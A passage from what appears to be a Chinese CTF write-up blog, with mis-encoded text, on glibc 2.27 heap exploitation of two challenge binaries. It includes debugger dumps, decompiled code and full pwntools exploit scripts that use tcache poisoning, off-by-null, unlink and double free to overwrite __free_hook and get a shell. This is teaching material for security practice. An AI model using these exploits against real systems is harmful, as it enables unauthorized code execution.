class="line">+0290 0x55c37c076290  00 00 00 00  00 00 00 00  51 00 00 00  00 00 00 00  â”‚....â”‚....â”‚Q...â”‚....â”‚</span><br><span class="line">+02a0 0x55c37c0762a0  30 63 07 7c  c3 55 00 00  10 60 07 7c  c3 55 00 00  â”‚0c.|â”‚.U..â”‚.`.|â”‚.U..â”‚</span><br><span class="line">+02b0 0x55c37c0762b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+02e0 0x55c37c0762e0  00 00 00 00  00 00 00 00  41 00 00 00  00 00 00 00  â”‚....â”‚....â”‚A...â”‚....â”‚</span><br><span class="line">+02f0 0x55c37c0762f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+0320 0x55c37c076320  00 00 00 00  00 00 00 00  51 00 00 00  00 00 00 00  â”‚....â”‚....â”‚Q...â”‚....â”‚</span><br><span class="line">+0330 0x55c37c076330  00 00 00 00  00 00 00 00  10 60 07 7c  c3 55 00 00  â”‚....â”‚....â”‚.`.|â”‚.U..â”‚</span><br><span class="line">+0340 0x55c37c076340  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+0370 0x55c37c076370  00 00 00 00  00 00 00 00  91 0c 02 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">+0380 0x55c37c076380  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x50 [  2]: 0x55c37c0762a0 â€”&gt; 0x55c37c076330 &lt;â€” 0x0</span><br></pre></td></tr></table></figure>
<p>æ³„éœ²å †åœ°å€ï¼Œåˆ©ç”¨heap_addrè®¡ç®—å‡ºå­˜å‚¨0x90å¤§å°çš„tacahe bin countçš„ä½ç½®ä»¥åŠ0x50å¤§å°çš„tacahe binåœ¨tacahe structä¸­çš„ä½ç½®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x330</span></span><br><span class="line">tacahe_addr = heap + <span class="number">0x68</span></span><br><span class="line">count0x90 = heap + <span class="number">0x17</span></span><br></pre></td></tr></table></figure>
<p>Step3 æ³„éœ²libc</p>
<p>æ³„éœ²libcçš„æ€è·¯å°±æ˜¯å°†0x90å¤§å°çš„tacahe binçš„conunt æ”¹ä¸º 7 è¿™æ ·å½“æˆ‘å†é‡Šæ”¾ä¸‹ä¸€ä¸ª0x90å¤§å°çš„å †çš„æ—¶å€™ä»–å°±ä¼šè¿›å…¥unsorted binè¿›è€Œunsorted bin attack</p>
<p>åœ¨è¿™ä¹‹å‰å…ˆåˆ©ç”¨ä¹‹å‰overlapä¿®æ”¹ tcachebin fd æŒ‡é’ˆæŒ‡å‘ç»“æ„ä½“ï¼Œç¬¬äºŒæ¬¡ç”³è¯·å°±èƒ½ç”³è¯·åˆ° tcache ç»“æ„ä½“,ä»è€Œä¿®æ”¹æ•°é‡tacahe count</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tacahe_addr))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4	</span></span><br><span class="line">edit(<span class="number">4</span>, p64(heap-<span class="number">0x319</span>)) <span class="comment">#ä»»æ„åœ°å€å†™</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; bins</span></span><br><span class="line"><span class="string"># tcachebins</span></span><br><span class="line"><span class="string">0x50 [  0]: 0x558836a30017 &lt;â€” ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x07&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶çš„0x90å¤§å°çš„tacahe count å·²ç»è¢«æ”¹æˆäº†7ï¼Œæ¥ä¸‹æ¥åªè¦é‡Šæ”¾ä¸€ä¸ªå¤§å°ä¸º0x90çš„chunkå®ƒå°±ä¼šè¿›å…¥unsorted bin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
<p>Step4: åˆ©ç”¨ä¹‹å‰çš„ä»»æ„åœ°å€å†™ä¿®æ”¹__free_hookä¸ºsystemæ¥getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">4</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br></pre></td></tr></table></figure>
<h3 id="exp-v6"><a class="header-anchor" href="#exp-v6">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28051)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;E&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;S&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1 0x21 </span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 0x51</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#3 0x41</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4 0x51</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x71&#x27;</span>)  <span class="comment">#chunk1 =&gt; 0x71</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">tacahe_addr = heap - <span class="number">0x2C8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tacahe_addr))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4	</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(heap-<span class="number">0x319</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>p.s. æœ¬é¢˜çš„flagåœ¨/home/ctf/flag.txt</p>
<h2 id="2021-ç¥¥äº‘æ¯-PasswordBox-free-Version"><a class="header-anchor" href="#2021-ç¥¥äº‘æ¯-PasswordBox-free-Version">Â¶</a>[2021 ç¥¥äº‘æ¯]PasswordBox free Version</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v3"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v3">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.å¼‚æˆ–ç®—æ³•
2.off by null
3.Unlink
4.glibc 2.27 -v1.4 double free
</code></pre>
<h3 id="åŠŸèƒ½åˆ†æ"><a class="header-anchor" href="#åŠŸèƒ½åˆ†æ">Â¶</a>åŠŸèƒ½åˆ†æ</h3>
<p>addå‡½æ•°ä¸»è¦ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size &lt;= <span class="number">0x100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your Pwd:&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  fgets(s, size + <span class="number">1</span>, <span class="built_in">stdin</span>);                <span class="comment">// off by null</span></span><br><span class="line">  encrypt((__int64)s, size);</span><br><span class="line">  *((_DWORD *)&amp;lenarray + <span class="number">8</span> * SHIDWORD(size)) = size;</span><br><span class="line">  *((_QWORD *)&amp;heaparray + <span class="number">4</span> * SHIDWORD(size)) = s;</span><br><span class="line">  isAlive[<span class="number">8</span> * SHIDWORD(size)] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !ifFirst )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First Add Done.Thx 4 Use. Save ID:%s&quot;</span>, *((<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;heaparray + <span class="number">4</span> * SHIDWORD(size)));</span><br><span class="line">    ifFirst = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fgets å­˜åœ¨off by null å¯ä»¥è®©æˆ‘ä»¬åé¢ä¿®æ”¹chunkçš„size</p>
<p>ä¸”è¾“å…¥çš„contentä¼šè¿›è¡Œä¸€æ¬¡åŠ å¯†ï¼ŒåŠ å¯†å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">encrypt</span><span class="params">(__int64 note, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">2</span> * (a2 / <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 % <span class="number">16</span> &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 % <span class="number">16</span> &gt; <span class="number">0</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_QWORD *)(<span class="number">8LL</span> * i + note) ^= key;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ä»¥å…«ä½ä¸ºå•ä½è¿›è¡Œäº¦æˆ–æ“ä½œï¼Œä½†æ˜¯æ¯æ¬¡çš„keyéƒ½æ˜¯éšæœºç”Ÿæˆçš„ï¼Œè€Œç”±äºè·å–æˆ‘ä»¬è¾“å…¥çš„æ˜¯fgets,å½“å®ƒè¯»åˆ°&quot;\n&quot;ä¸”ä½ è¾“å…¥çš„contentå°äºsizeï¼Œå°±ä¼šå°†å‰©ä¸‹çš„ç”¨0å¡«å……ï¼Œç”±äº0^key=keyè¿™æ ·æˆ‘ä»¬å°±èƒ½å¾—åˆ°keyäº†</p>
<p>editå‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !isFirst )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">    getchar();</span><br><span class="line">    isFirst = <span class="number">1LL</span>;</span><br><span class="line">    read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;heaparray + <span class="number">4</span> * v1), <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Because this is Free Version.The edit Function is Limit to use&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªå †ï¼Œä¸€ç”Ÿåªèƒ½edit1æ¬¡ï¼Œä¸”åªèƒ½æ”¹0x10çš„å¤§å°</p>
<p>freeå’Œshowéƒ½æ˜¯æ­£å¸¸çš„freeå’Œshow</p>
<h3 id="è§£é¢˜æ­¥éª¤-v3"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤-v3">Â¶</a>è§£é¢˜æ­¥éª¤</h3>
<p>Step1: è·å¾—key<br>
åˆ©ç”¨a ^ 0 = açš„ç‰¹æ€§ï¼Œå¾—åˆ°key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Save ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br></pre></td></tr></table></figure>
<p>Step2:æ„é€ overlapped chunk leak libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¡«æ»¡tacahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#0 (7)</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1  (8)</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2 (9)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3  (10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)  <span class="comment">#freeä¸€ä¸ªæ­£å¸¸çš„chunkä»¥ä¾¿ç»•è¿‡Unlinkæ£€æµ‹</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64((<span class="number">0x80</span>+<span class="number">0x100</span>)^key)) <span class="comment">#size = chunk8 + chunk7</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#unlink </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) ^ key </span><br><span class="line">libc_base -= <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
<p>Step3:double freeä¿®æ”¹free_hook,æ³¨æ„åœ¨ç¬¬äºŒæ¬¡freeä¹‹å‰è¦ä¿®æ”¹æ ‡å¿—ä½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#double free</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook^key))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system^key))</span><br><span class="line">add(<span class="number">0x60</span>,p64(binsh^key))</span><br><span class="line">free(<span class="number">5</span>) </span><br></pre></td></tr></table></figure>
<h3 id="EXP-v2"><a class="header-anchor" href="#EXP-v2">Â¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;pwdFree&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdFree&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input The ID You Want Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length Of Your Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Which PwdBox You Want Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Idx you want 2 Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Save ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#0 (7)</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1  (8)</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2 (9)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3  (10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)  <span class="comment"># -&gt;unsortdebin</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64((<span class="number">0x80</span>+<span class="number">0x100</span>)^key)) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#unlink </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overlap</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) ^ key </span><br><span class="line">libc_base -= <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#one = [0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">binsh = u64(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#tacahe check bypass</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#double free</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span 